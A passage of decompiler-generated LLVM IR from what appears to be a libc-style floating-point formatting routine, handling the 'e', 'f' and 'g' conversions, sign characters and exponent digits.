  %v5_8052252 = and i1 %v4_8052252, %v3_8052252
  br i1 %v5_8052252, label %dec_label_pc_8052261, label %dec_label_pc_8052254

dec_label_pc_8052254:                             ; preds = %dec_label_pc_8052249
  %v4_8052254 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_8052261

dec_label_pc_8052261:                             ; preds = %dec_label_pc_8052249, %dec_label_pc_8052254
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_8052249 ], [ %v4_8052254, %dec_label_pc_8052254 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8052249 ], [ 69, %dec_label_pc_8052254 ]
  %v12_8052261 = icmp eq i8 %stack_var_-206.1, 103
  %v1_8052266 = icmp eq i1 %v12_8052261, false
  br i1 %v1_8052266, label %dec_label_pc_805226f, label %dec_label_pc_8052268

dec_label_pc_8052268:                             ; preds = %dec_label_pc_8052261
  %v0_8052268 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_8052268, 1
  br i1 %tmp137, label %dec_label_pc_8052276, label %dec_label_pc_805226c

dec_label_pc_805226c:                             ; preds = %dec_label_pc_8052268
  %v1_805226c = add i32 %v0_8052268, -1
  store i32 %v1_805226c, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052276

dec_label_pc_805226f:                             ; preds = %dec_label_pc_8052261
  %v12_805226f = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_805226f, label %dec_label_pc_805227a, label %dec_label_pc_805226f.dec_label_pc_8052276_crit_edge

dec_label_pc_805226f.dec_label_pc_8052276_crit_edge: ; preds = %dec_label_pc_805226f
  %v0_8052276.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052276

dec_label_pc_8052276:                             ; preds = %dec_label_pc_805226f.dec_label_pc_8052276_crit_edge, %dec_label_pc_8052268, %dec_label_pc_805226c
  %v0_8052276 = phi i32 [ %v0_8052276.pre, %dec_label_pc_805226f.dec_label_pc_8052276_crit_edge ], [ %v0_8052268, %dec_label_pc_8052268 ], [ %v1_805226c, %dec_label_pc_805226c ]
  store i32 %v0_8052276, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522a7

dec_label_pc_805227a:                             ; preds = %dec_label_pc_805226f
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_805227e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805227e = add i32 %v0_805227e, -1
  store i32 %v2_805227e, i32* %ebx.global-to-local, align 4
  %v5_8052285 = icmp slt i32 %v2_805227e, -1
  br i1 %v5_8052285, label %dec_label_pc_8052287, label %dec_label_pc_80522a7

dec_label_pc_8052287:                             ; preds = %dec_label_pc_805227a
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805228f = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_805228f, i32* %eax.global-to-local, align 4
  %v4_8052297 = bitcast i32* %stack_var_-72 to i8*
  %v5_8052297 = call i32 @__GI_memset(i8* %v4_8052297, i32 48, i32 21)
  store i32 %v5_8052297, i32* %eax.global-to-local, align 4
  %v0_80522b7.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80522a7

dec_label_pc_80522a7:                             ; preds = %dec_label_pc_805227a, %dec_label_pc_8052287, %dec_label_pc_8052276
  %v1_80522c7 = phi i32 [ %v0_8052276, %dec_label_pc_8052276 ], [ %v0_80522b7.pr.pre, %dec_label_pc_8052287 ], [ %v2_805227e, %dec_label_pc_805227a ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_80522ba = icmp sgt i32 %v1_80522c7, 20
  br i1 %v7_80522ba, label %dec_label_pc_80522bc, label %dec_label_pc_80522c7

dec_label_pc_80522bc:                             ; preds = %dec_label_pc_80522a7
  %v2_80522bc = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_80522bc, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80522db.preheader

dec_label_pc_80522c7:                             ; preds = %dec_label_pc_80522a7
  %v0_80522c7 = load i32, i32* @esp, align 4
  %v2_80522c7 = add i32 %v1_80522c7, 165
  %v3_80522c7 = add i32 %v2_80522c7, %v0_80522c7
  store i32 %v3_80522c7, i32* %eax.global-to-local, align 4
  %v1_80522ce = add i32 %v3_80522c7, 2
  store i32 %v1_80522ce, i32* %ecx.global-to-local, align 4
  %v2_80522d1 = inttoptr i32 %v1_80522ce to i8*
  %v3_80522d1 = load i8, i8* %v2_80522d1, align 1
  %v4_80522d1 = add i8 %v3_80522d1, -53
  %v9_80522d1 = sub i8 52, %v3_80522d1
  %v10_80522d1 = and i8 %v9_80522d1, %v3_80522d1
  %v11_80522d1 = icmp slt i8 %v10_80522d1, 0
  %v13_80522d1 = icmp slt i8 %v4_80522d1, 0
  %v2_80522d5 = icmp eq i1 %v13_80522d1, %v11_80522d1
  %v3_80522d5 = zext i1 %v2_80522d5 to i32
  br label %dec_label_pc_80522db.preheader

dec_label_pc_80522db.preheader:                   ; preds = %dec_label_pc_80522c7, %dec_label_pc_80522bc
  %v0_80522db63 = phi i32 [ %v1_80522ce, %dec_label_pc_80522c7 ], [ %v2_80522bc, %dec_label_pc_80522bc ]
  %storemerge52 = phi i32 [ %v3_80522d5, %dec_label_pc_80522c7 ], [ 0, %dec_label_pc_80522bc ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %dec_label_pc_80522db.backedge, %dec_label_pc_80522db.preheader
  %v3_80522dc = phi i32 [ %v3_80522dc.pre, %dec_label_pc_80522db.backedge ], [ %storemerge52, %dec_label_pc_80522db.preheader ]
  %v0_80522db = phi i32 [ %v0_80522de, %dec_label_pc_80522db.backedge ], [ %v0_80522db63, %dec_label_pc_80522db.preheader ]
  %v1_80522db = add i32 %v0_80522db, -1
  store i32 %v1_80522db, i32* %ecx.global-to-local, align 4
  %v1_80522dc = inttoptr i32 %v1_80522db to i8*
  %v2_80522dc = load i8, i8* %v1_80522dc, align 1
  %v4_80522dc = trunc i32 %v3_80522dc to i8
  %v5_80522dc = add i8 %v2_80522dc, %v4_80522dc
  store i8 %v5_80522dc, i8* %v1_80522dc, align 1
  %v0_80522de = load i32, i32* %ecx.global-to-local, align 4
  %v1_80522de = inttoptr i32 %v0_80522de to i8*
  %v2_80522de = load i8, i8* %v1_80522de, align 1
  %v3_80522de = zext i8 %v2_80522de to i32
  %v4_80522de = load i32, i32* %edx.global-to-local, align 4
  %v5_80522de = and i32 %v4_80522de, -256
  %v6_80522de = or i32 %v5_80522de, %v3_80522de
  store i32 %v6_80522de, i32* %edx.global-to-local, align 4
  %v7_80522e0 = icmp eq i8 %v2_80522de, 48
  br i1 %v7_80522e0, label %dec_label_pc_80522db.backedge, label %dec_label_pc_80522e5

dec_label_pc_80522db.backedge:                    ; preds = %dec_label_pc_80522db, %dec_label_pc_80522e5
  %v3_80522dc.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80522db

dec_label_pc_80522e5:                             ; preds = %dec_label_pc_80522db
  %v2_80522e5 = add i8 %v2_80522de, -57
  %v7_80522e5 = sub i8 56, %v2_80522de
  %v8_80522e5 = and i8 %v7_80522e5, %v2_80522de
  %v9_80522e5 = icmp slt i8 %v8_80522e5, 0
  %v10_80522e5 = icmp eq i8 %v2_80522e5, 0
  %v11_80522e5 = icmp slt i8 %v2_80522e5, 0
  %v3_80522e8 = icmp eq i1 %v11_80522e5, %v9_80522e5
  %v4_80522e8 = icmp eq i1 %v10_80522e5, false
  %v5_80522e8 = and i1 %v4_80522e8, %v3_80522e8
  br i1 %v5_80522e8, label %dec_label_pc_80522db.backedge, label %dec_label_pc_80522ea

dec_label_pc_80522ea:                             ; preds = %dec_label_pc_80522e5
  %v2_80522ea = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_80522ea, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_80522de, %v2_80522ea
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_80522f5, label %dec_label_pc_8052302

dec_label_pc_80522f5:                             ; preds = %dec_label_pc_80522ea
  store i32 %v2_80521d7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805230b

dec_label_pc_8052302:                             ; preds = %dec_label_pc_80522ea
  store i32 %v2_80522ea, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_80522ea, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805230b

dec_label_pc_805230b:                             ; preds = %dec_label_pc_80522f5, %dec_label_pc_8052302
  %v0_805230b = phi i32 [ %v0_80522de, %dec_label_pc_80522f5 ], [ %v2_80522ea, %dec_label_pc_8052302 ]
  %v1_805230b = add i32 %v0_805230b, 1
  store i32 %v1_805230b, i32* %eax.global-to-local, align 4
  %v2_8052312 = inttoptr i32 %v1_805230b to i8*
  store i8 0, i8* %v2_8052312, align 1
  br i1 %v1_8052266, label %dec_label_pc_8052338, label %dec_label_pc_805231d

dec_label_pc_805231d:                             ; preds = %dec_label_pc_805230b
  %v0_805231d = load i32, i32* %esi.global-to-local, align 4
  %v5_8052320 = icmp slt i32 %v0_805231d, -4
  br i1 %v5_8052320, label %dec_label_pc_8052345, label %dec_label_pc_8052322

dec_label_pc_8052322:                             ; preds = %dec_label_pc_805231d
  %v1_8052322 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8052324 = icmp slt i32 %v1_8052322, %v0_805231d
  br i1 %v7_8052324, label %dec_label_pc_8052345, label %dec_label_pc_805232d

dec_label_pc_805232d:                             ; preds = %dec_label_pc_8052322
  %v2_8052334 = sub i32 %v1_8052322, %v0_805231d
  store i32 %v2_8052334, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8052349

dec_label_pc_8052338:                             ; preds = %dec_label_pc_805230b
  %v4_8052338 = zext i8 %stack_var_-206.1 to i32
  %v5_8052338 = load i32, i32* %ecx.global-to-local, align 4
  %v6_8052338 = and i32 %v5_8052338, -256
  %v7_8052338 = or i32 %v6_8052338, %v4_8052338
  store i32 %v7_8052338, i32* %ecx.global-to-local, align 4
  %v10_8052340 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_8052340, label %dec_label_pc_8052338.dec_label_pc_8052349_crit_edge, label %dec_label_pc_8052345

dec_label_pc_8052338.dec_label_pc_8052349_crit_edge: ; preds = %dec_label_pc_8052338
  %v0_8052349.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052349

dec_label_pc_8052345:                             ; preds = %dec_label_pc_805231d, %dec_label_pc_8052322, %dec_label_pc_8052338
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_8052338 ], [ 103, %dec_label_pc_8052322 ], [ 103, %dec_label_pc_805231d ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052353

dec_label_pc_8052349:                             ; preds = %dec_label_pc_8052338.dec_label_pc_8052349_crit_edge, %dec_label_pc_805232d
  %v0_8052349 = phi i32 [ %v0_8052349.pre, %dec_label_pc_8052338.dec_label_pc_8052349_crit_edge ], [ %v0_805231d, %dec_label_pc_805232d ]
  store i32 %v0_8052349, i32* %ebx.global-to-local, align 4
  %v2_805234b = icmp slt i32 %v0_8052349, 0
  %v1_805234d = icmp eq i1 %v2_805234b, false
  br i1 %v1_805234d, label %dec_label_pc_8052353, label %dec_label_pc_805234f

dec_label_pc_805234f:                             ; preds = %dec_label_pc_8052349
  %v0_805234f = load i32, i32* %edx.global-to-local, align 4
  %v1_805234f = add i32 %v0_805234f, -1
  store i32 %v1_805234f, i32* %edx.global-to-local, align 4
  %v1_8052350 = inttoptr i32 %v1_805234f to i8*
  store i8 48, i8* %v1_8052350, align 1
  %v0_8052388.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052353

dec_label_pc_8052353:                             ; preds = %dec_label_pc_8052349, %dec_label_pc_8052345, %dec_label_pc_805234f
  %v1_80523e3 = phi i32 [ %v0_8052349, %dec_label_pc_8052349 ], [ %v0_8052388.pre, %dec_label_pc_805234f ], [ 0, %dec_label_pc_8052345 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_8052349 ], [ 102, %dec_label_pc_805234f ], [ %stack_var_-197.0, %dec_label_pc_8052345 ]
  %v2_8052353 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8052353, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_805236e = load i32, i32* %edx.global-to-local, align 4
  %v1_805236e = inttoptr i32 %v0_805236e to i8*
  %v2_805236e = load i8, i8* %v1_805236e, align 1
  %v3_805236e = zext i8 %v2_805236e to i32
  %v5_805236e = and i32 %v2_8052353, -256
  %v6_805236e = or i32 %v3_805236e, %v5_805236e
  store i32 %v6_805236e, i32* %eax.global-to-local, align 4
  %v1_8052370 = add i32 %v0_805236e, 1
  store i32 %v1_8052370, i32* %edi.global-to-local, align 4
  store i32 %v6_805236e, i32* %stack_var_-22, align 4
  %v2_805237e = sub i32 %v1_805230b, %v1_8052370
  store i32 %v2_805237e, i32* %edx.global-to-local, align 4
  %v1_8052388 = icmp eq i32 %v1_80523e3, 0
  %v2_8052388 = icmp slt i32 %v1_80523e3, 0
  br i1 %v2_8052388, label %dec_label_pc_80523d7, label %dec_label_pc_805238c

dec_label_pc_805238c:                             ; preds = %dec_label_pc_8052353
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8052398 = sub i32 %v1_80523e3, %v2_805237e
  %v8_8052398 = xor i32 %v2_805237e, %v1_80523e3
  %v9_8052398 = xor i32 %v2_8052398, %v1_80523e3
  %v10_8052398 = and i32 %v9_8052398, %v8_8052398
  %v11_8052398 = icmp slt i32 %v10_8052398, 0
  %v13_8052398 = icmp slt i32 %v2_8052398, 0
  %v2_805239a = icmp eq i1 %v13_8052398, %v11_8052398
  br i1 %v2_805239a, label %dec_label_pc_805239c, label %dec_label_pc_80523d0

dec_label_pc_805239c:                             ; preds = %dec_label_pc_805238c
  store i32 %v2_8052398, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8052398, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_80523b1, label %dec_label_pc_80523cc

dec_label_pc_80523b1:                             ; preds = %dec_label_pc_805239c
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_80523cc

dec_label_pc_80523cc:                             ; preds = %dec_label_pc_805239c, %dec_label_pc_80523b1
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_80523b1 ], [ %stack_var_-132, %dec_label_pc_805239c ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80523ec

dec_label_pc_80523d0:                             ; preds = %dec_label_pc_805238c
  %v4_80523d2 = icmp eq i1 %v1_8052388, false
  br i1 %v4_80523d2, label %dec_label_pc_80523dd, label %dec_label_pc_80523d4

dec_label_pc_80523d4:                             ; preds = %dec_label_pc_80523d0
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80523d7

dec_label_pc_80523d7:                             ; preds = %dec_label_pc_8052353, %dec_label_pc_80523d4
  %v0_805241f73 = phi i32 [ %v1_80523e3, %dec_label_pc_8052353 ], [ -1, %dec_label_pc_80523d4 ]
  %v2_80523d7 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80523d7, i32* @ecx, align 4
  br label %dec_label_pc_80523ec

dec_label_pc_80523dd:                             ; preds = %dec_label_pc_80523d0
  %v2_80523e1 = add i32 %v1_8052370, %v1_80523e3
  store i32 %v2_80523e1, i32* %edi.global-to-local, align 4
  %v2_80523e3 = sub i32 %v2_805237e, %v1_80523e3
  store i32 %v2_80523e3, i32* %edx.global-to-local, align 4
  %v2_80523e5 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80523e5, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80523ec

dec_label_pc_80523ec:                             ; preds = %dec_label_pc_80523d7, %dec_label_pc_80523cc, %dec_label_pc_80523dd
  %v0_805241f72 = phi i32 [ %v0_805241f73, %dec_label_pc_80523d7 ], [ -1, %dec_label_pc_80523cc ], [ -1, %dec_label_pc_80523dd ]
  %v0_8052408 = phi i32 [ %v2_80523d7, %dec_label_pc_80523d7 ], [ %storemerge10, %dec_label_pc_80523cc ], [ %v2_80523e5, %dec_label_pc_80523dd ]
  %v0_80523f9 = phi i32 [ %v2_805237e, %dec_label_pc_80523d7 ], [ 0, %dec_label_pc_80523cc ], [ %v2_80523e3, %dec_label_pc_80523dd ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_80523f3 = inttoptr i32 %v1_805204b to i8*
  %v3_80523f3 = load i8, i8* %v2_80523f3, align 1
  %v4_80523f3 = and i8 %v3_80523f3, 16
  %v5_80523f3 = icmp eq i8 %v4_80523f3, 0
  %v1_80523f7 = icmp eq i1 %v5_80523f3, false
  br i1 %v1_80523f7, label %dec_label_pc_8052408, label %dec_label_pc_80523f9

dec_label_pc_80523f9:                             ; preds = %dec_label_pc_80523ec
  %v1_80523f9 = icmp eq i32 %v0_80523f9, 0
  %v1_80523fb = icmp eq i1 %v1_80523f9, false
  br i1 %v1_80523fb, label %dec_label_pc_8052408, label %dec_label_pc_80523fd

dec_label_pc_80523fd:                             ; preds = %dec_label_pc_80523f9
  br i1 %v12_8052261, label %dec_label_pc_805241f, label %dec_label_pc_8052404

dec_label_pc_8052404:                             ; preds = %dec_label_pc_80523fd
  %v0_8052404 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_8052404, 1
  br i1 %tmp140, label %dec_label_pc_805241f, label %dec_label_pc_8052408

dec_label_pc_8052408:                             ; preds = %dec_label_pc_8052404, %dec_label_pc_80523f9, %dec_label_pc_80523ec
  %v1_8052408 = inttoptr i32 %v0_8052408 to i32*
  store i32 112, i32* %v1_8052408, align 4
  %v0_805240e = load i32, i32* @ecx, align 4
  %v1_805240e = add i32 %v0_805240e, 4
  %v2_805240e = inttoptr i32 %v1_805240e to i32*
  store i32 1, i32* %v2_805240e, align 4
  %v0_8052415 = load i32, i32* @ecx, align 4
  %v1_8052415 = add i32 %v0_8052415, 8
  %v2_8052415 = inttoptr i32 %v1_8052415 to i32*
  store i32 ptrtoint (i32* @global_var_8057fa0.277 to i32), i32* %v2_8052415, align 4
  %v0_805241c = load i32, i32* @ecx, align 4
  %v1_805241c = add i32 %v0_805241c, 12
  store i32 %v1_805241c, i32* @ecx, align 4
  %v0_805241f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805241f

dec_label_pc_805241f:                             ; preds = %dec_label_pc_8052404, %dec_label_pc_80523fd, %dec_label_pc_8052408
  %v0_8052424 = phi i32 [ %v0_8052408, %dec_label_pc_8052404 ], [ %v0_8052408, %dec_label_pc_80523fd ], [ %v1_805241c, %dec_label_pc_8052408 ]
  %v0_805241f = phi i32 [ %v0_805241f72, %dec_label_pc_8052404 ], [ %v0_805241f72, %dec_label_pc_80523fd ], [ %v0_805241f.pre, %dec_label_pc_8052408 ]
  %v1_805241f = add i32 %v0_805241f, 1
  %v8_805241f = icmp eq i32 %v1_805241f, 0
  store i32 %v1_805241f, i32* %ebx.global-to-local, align 4
  br i1 %v8_805241f, label %dec_label_pc_8052439, label %dec_label_pc_8052422

dec_label_pc_8052422:                             ; preds = %dec_label_pc_805241f
  store i32 %v1_805241f, i32* %eax.global-to-local, align 4
  %v1_8052424 = inttoptr i32 %v0_8052424 to i32*
  store i32 176, i32* %v1_8052424, align 4
  %v0_805242a = load i32, i32* %eax.global-to-local, align 4
  %v1_805242a = sub i32 0, %v0_805242a
  store i32 %v1_805242a, i32* %eax.global-to-local, align 4
  %v1_805242c = load i32, i32* @ecx, align 4
  %v2_805242c = add i32 %v1_805242c, 4
  %v3_805242c = inttoptr i32 %v2_805242c to i32*
  store i32 %v1_805242a, i32* %v3_805242c, align 4
  %v0_805242f = load i32, i32* @ecx, align 4
  %v1_805242f = add i32 %v0_805242f, 8
  %v2_805242f = inttoptr i32 %v1_805242f to i32*
  store i32 ptrtoint (i32* @global_var_8057f93.276 to i32), i32* %v2_805242f, align 4
  %v0_8052436 = load i32, i32* @ecx, align 4
  %v1_8052436 = add i32 %v0_8052436, 12
  store i32 %v1_8052436, i32* @ecx, align 4
  br label %dec_label_pc_8052439

dec_label_pc_8052439:                             ; preds = %dec_label_pc_805241f, %dec_label_pc_8052422
  %v0_805243d = phi i32 [ %v0_8052424, %dec_label_pc_805241f ], [ %v1_8052436, %dec_label_pc_8052422 ]
  %v0_8052439 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052439 = icmp eq i32 %v0_8052439, 0
  br i1 %v1_8052439, label %dec_label_pc_805244c, label %dec_label_pc_805243d

dec_label_pc_805243d:                             ; preds = %dec_label_pc_8052439
  %v1_805243d = inttoptr i32 %v0_805243d to i32*
  store i32 112, i32* %v1_805243d, align 4
  %v0_8052443 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052443 = load i32, i32* @ecx, align 4
  %v2_8052443 = add i32 %v1_8052443, 4
  %v3_8052443 = inttoptr i32 %v2_8052443 to i32*
  store i32 %v0_8052443, i32* %v3_8052443, align 4
  %v0_8052446 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052446 = load i32, i32* @ecx, align 4
  %v2_8052446 = add i32 %v1_8052446, 8
  %v3_8052446 = inttoptr i32 %v2_8052446 to i32*
  store i32 %v0_8052446, i32* %v3_8052446, align 4
  %v0_8052449 = load i32, i32* @ecx, align 4
  %v1_8052449 = add i32 %v0_8052449, 12
  store i32 %v1_8052449, i32* @ecx, align 4
  br label %dec_label_pc_805244c

dec_label_pc_805244c:                             ; preds = %dec_label_pc_8052439, %dec_label_pc_805243d
  %v0_805246a = phi i32 [ %v0_805243d, %dec_label_pc_8052439 ], [ %v1_8052449, %dec_label_pc_805243d ]
  br i1 %v1_8052266, label %dec_label_pc_8052460, label %dec_label_pc_8052453

dec_label_pc_8052453:                             ; preds = %dec_label_pc_805244c
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_805245a = load i8, i8* %v2_80523f3, align 1
  %v4_805245a = and i8 %v3_805245a, 16
  %v5_805245a = icmp eq i8 %v4_805245a, 0
  br i1 %v5_805245a, label %dec_label_pc_805247d, label %dec_label_pc_8052460

dec_label_pc_8052460:                             ; preds = %dec_label_pc_8052453, %dec_label_pc_805244c
  %v0_8052460 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052462 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052462 = sub i32 %v0_8052460, %v1_8052462
  store i32 %v2_8052462, i32* %eax.global-to-local, align 4
  %v1_8052464 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052464 = sub i32 %v2_8052462, %v1_8052464
  %v8_8052464 = xor i32 %v1_8052464, %v2_8052462
  %v9_8052464 = xor i32 %v2_8052464, %v2_8052462
  %v10_8052464 = and i32 %v9_8052464, %v8_8052464
  %v11_8052464 = icmp slt i32 %v10_8052464, 0
  %v13_8052464 = icmp slt i32 %v2_8052464, 0
  %v2_8052466 = icmp eq i1 %v13_8052464, %v11_8052464
  br i1 %v2_8052466, label %dec_label_pc_805247d, label %dec_label_pc_8052468

dec_label_pc_8052468:                             ; preds = %dec_label_pc_8052460
  %v2_8052468 = sub i32 %v1_8052464, %v2_8052462
  store i32 %v2_8052468, i32* %ebp.global-to-local, align 4
  %v1_805246a = inttoptr i32 %v0_805246a to i32*
  store i32 176, i32* %v1_805246a, align 4
  %v0_8052470 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052470 = load i32, i32* @ecx, align 4
  %v2_8052470 = add i32 %v1_8052470, 4
  %v3_8052470 = inttoptr i32 %v2_8052470 to i32*
  store i32 %v0_8052470, i32* %v3_8052470, align 4
  %v0_8052473 = load i32, i32* @ecx, align 4
  %v1_8052473 = add i32 %v0_8052473, 8
  %v2_8052473 = inttoptr i32 %v1_8052473 to i32*
  store i32 ptrtoint (i32* @global_var_8057f93.276 to i32), i32* %v2_8052473, align 4
  %v0_805247a = load i32, i32* @ecx, align 4
  %v1_805247a = add i32 %v0_805247a, 12
  store i32 %v1_805247a, i32* @ecx, align 4
  br label %dec_label_pc_805247d

dec_label_pc_805247d:                             ; preds = %dec_label_pc_8052460, %dec_label_pc_8052453, %dec_label_pc_8052468
  %v1_805250084 = phi i32 [ %v0_805246a, %dec_label_pc_8052460 ], [ %v0_805246a, %dec_label_pc_8052453 ], [ %v1_805247a, %dec_label_pc_8052468 ]
  %v12_805247d = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_805247d, label %dec_label_pc_80524f3, label %dec_label_pc_8052484

dec_label_pc_8052484:                             ; preds = %dec_label_pc_805247d
  %v0_805248b = load i32, i32* %esi.global-to-local, align 4
  %v2_805248b = icmp slt i32 %v0_805248b, 0
  %v1_805248d = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_805248b, i32* %edx.global-to-local, align 4
  br i1 %v2_805248b, label %dec_label_pc_805249c, label %dec_label_pc_8052493

dec_label_pc_8052493:                             ; preds = %dec_label_pc_8052484
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80524a5

dec_label_pc_805249c:                             ; preds = %dec_label_pc_8052484
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_80524a3 = sub i32 0, %v0_805248b
  store i32 %v1_80524a3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80524a5

dec_label_pc_80524a5:                             ; preds = %dec_label_pc_8052493, %dec_label_pc_805249c
  %v0_80524b977 = phi i32 [ %v0_805248b, %dec_label_pc_8052493 ], [ %v1_80524a3, %dec_label_pc_805249c ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_80524ad = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80524ad, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524b9

dec_label_pc_80524b9:                             ; preds = %dec_label_pc_80524b9.backedge, %dec_label_pc_80524a5
  %v0_80524c7 = phi i32 [ %v0_80524ca, %dec_label_pc_80524b9.backedge ], [ 2, %dec_label_pc_80524a5 ]
  %v0_80524c3 = phi i32 [ %v0_80524c3.pre, %dec_label_pc_80524b9.backedge ], [ %v2_80524ad, %dec_label_pc_80524a5 ]
  %v0_80524b9 = phi i32 [ %v9_80524c1, %dec_label_pc_80524b9.backedge ], [ %v0_80524b977, %dec_label_pc_80524a5 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_80524c0 = ashr i32 %v0_80524b9, 31
  %v2_80524c1 = zext i32 %v0_80524b9 to i64
  %v4_80524c1 = zext i32 %v1_80524c0 to i64
  %v5_80524c1 = mul nuw i64 %v4_80524c1, 4294967296
  %v6_80524c1 = or i64 %v5_80524c1, %v2_80524c1
  %v8_80524c1 = sdiv i64 %v6_80524c1, 10
  %v9_80524c1 = trunc i64 %v8_80524c1 to i32
  store i32 %v9_80524c1, i32* %eax.global-to-local, align 4
  %v11_80524c1 = srem i64 %v6_80524c1, 10
  %v12_80524c1 = trunc i64 %v11_80524c1 to i8
  %v1_80524c3 = add i32 %v0_80524c3, -1
  store i32 %v1_80524c3, i32* %ebx.global-to-local, align 4
  %v1_80524c4 = add i8 %v12_80524c1, 48
  %v1_80524c7 = add i32 %v0_80524c7, 1
  store i32 %v1_80524c7, i32* %esi.global-to-local, align 4
  %v3_80524c8 = inttoptr i32 %v1_80524c3 to i8*
  store i8 %v1_80524c4, i8* %v3_80524c8, align 1
  %v0_80524ca = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_80524c1, i32* %edx.global-to-local, align 4
  %v7_80524cf = icmp sgt i32 %v0_80524ca, 3
  br i1 %v7_80524cf, label %dec_label_pc_80524d1, label %dec_label_pc_80524b9.backedge

dec_label_pc_80524d1:                             ; preds = %dec_label_pc_80524b9
  %v2_80524d1 = icmp eq i32 %v9_80524c1, 0
  %v1_80524d3 = icmp eq i1 %v2_80524d1, false
  br i1 %v1_80524d3, label %dec_label_pc_80524b9.backedge, label %dec_label_pc_80524d5

dec_label_pc_80524b9.backedge:                    ; preds = %dec_label_pc_80524d1, %dec_label_pc_80524b9
  %v0_80524c3.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80524b9

dec_label_pc_80524d5:                             ; preds = %dec_label_pc_80524d1
  %v0_80524d5 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_80524d5, i32* %edx.global-to-local, align 4
  %v0_80524d7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80524d7 = add i32 %v0_80524d7, -2
  store i32 %v1_80524d7, i32* %eax.global-to-local, align 4
  %v1_80524da = trunc i32 %v0_80524d5 to i8
  %v3_80524da = add i32 %v0_80524d7, -1
  %v4_80524da = inttoptr i32 %v3_80524da to i8*
  store i8 %v1_80524da, i8* %v4_80524da, align 1
  %v5_80524dd = load i32, i32* %edx.global-to-local, align 4
  %v6_80524dd = and i32 %v5_80524dd, -256
  %v7_80524dd = or i32 %v6_80524dd, %stack_var_-42.0
  store i32 %v7_80524dd, i32* %edx.global-to-local, align 4
  %v2_80524e1 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80524e1 = add i32 %v2_80524e1, -2
  %v4_80524e1 = inttoptr i32 %v3_80524e1 to i8*
  store i8 %v1_805248d, i8* %v4_80524e1, align 1
  %v0_80524e4 = load i32, i32* @ecx, align 4
